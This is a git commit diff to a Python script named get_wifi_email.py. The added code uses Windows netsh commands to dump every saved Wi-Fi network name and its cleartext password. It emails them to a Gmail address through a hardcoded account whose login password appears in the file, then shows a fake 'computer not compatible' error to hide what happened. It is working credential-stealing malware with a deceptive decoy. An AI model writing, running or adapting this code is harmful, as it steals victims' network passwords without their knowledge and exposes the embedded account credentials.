d930124777bebf6bd565d8c414521238ca539883
mirage-abdelle <76264656+mirage-abdelle@users.noreply.github.com>
2021-10-13 01:11:13 +0200

    Update get_wifi_email.py

--- get_wifi_email.py
+++ get_wifi_email.py
@@ -1,34 +1,69 @@
-# libreris
-import smtplib , ssl
+import os
+from tkinter import messagebox
+import smtplib 
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 
-# email
-sender = '#sender email#'
-receiver = '#receiver email#'
-body = '#msg#'
 
-#msg
-msg = MIMEText(body ,'html')
-msg['Subject'] ='#the  email Subject#'
-msg['From'] = '#sendr#'
-msg['To'] = ','.join(receiver)
 
-#login
-s=smtplib.SMTP_SSL(host= '#sender emil#' , port= 465)
-s.login(user='#sender email#' , password= '# email password#')
-s.sendmail(sender,receiver,msg.as_string())
+
+os.system('netsh wlan show profiles  > pro.txt')
+
+
+
+lst=list()
+
+hf = open('pro.txt')
+for line in hf :
+    if   "Tous" in line   :
+        
+        x = line.split()
+        lst.append(x[5])
+
+pst = list()
+if len(lst)!=0:
+    for a in lst :
+        os.system('netsh wlan show profiles '+a+' key = clear > '+a+'pass.txt')
+        hd = open(a+"pass.txt")
+        for line in hd :
+            if 'Contenu' in line :
+                y=line.split()
+                t=(a,y[5])
+                pst.append(t)
+                continue
+
+          
+
+email_message = ""
+
+
+for n,k in pst:
+    email_message += "ssid :" +n+"          password :"+k+"\n" 
+
+
+
+
+
+
+
+sender ='ethical.mirage@gmail.com'
+receiver = 'mirage.abdelle@gmail.com'
+body= email_message
+
+msg = MIMEText(body , 'html')
+msg['Subject']= 'Python Email'
+msg['From'] = sender
+msg['To'] =','.join(receiver)
+
+
+
+
+s=smtplib.SMTP_SSL(host= 'smtp.gmail.com', port = 465)
+s.login(user=sender,password='kimo11.22')
+s.sendmail(sender, receiver , msg.as_string())
 s.quit()
 
 
-
-from tkinter import *
-from tkinter import messagebox
-
-
-def hello():
   
-   messagebox.showinfo("Erorre","your computer is no compatibel")
+messagebox.showinfo("Erorre","your computer is no compatibel")
 
-hello()
+
